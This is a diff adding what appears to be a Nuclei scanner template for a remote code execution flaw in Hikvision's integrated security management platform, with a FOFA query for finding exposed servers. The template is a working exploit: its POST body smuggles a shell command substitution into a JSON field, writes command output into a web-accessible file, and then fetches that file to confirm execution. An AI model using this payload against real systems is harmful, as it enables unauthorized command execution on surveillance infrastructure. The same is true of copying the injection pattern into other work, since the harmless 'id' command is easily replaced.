@@ -1,0 +1,39 @@
+id: Hikvision-iSecure-Cente-detection-Rce
+
+info:
+  name: 海康威视综合安防detection 远程代码执行
+  author: god
+  severity: critical
+  description: 海康威视综合安防detection 远程代码执行
+  metadata:
+    fofa-query: app="HIKVISION-综合安防管理平台"||title="综合安防管理平台"
+  tags: Hikvision,rce
+
+http:
+- raw:
+  - |
+    @timeout: 30s
+    POST /center/api/installation/detection HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/105.0.1249.139 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+    Content-Type: application/json;charset=UTF-8
+
+    {"type":"environment","operate":"","machines":{"id":  "$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/1.txt)"}}
+  - |+
+    @timeout: 30s
+    GET /vms/static/1.txt HTTP/1.1
+    Host: {{Hostname}}
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "uid")'  
+        condition: and
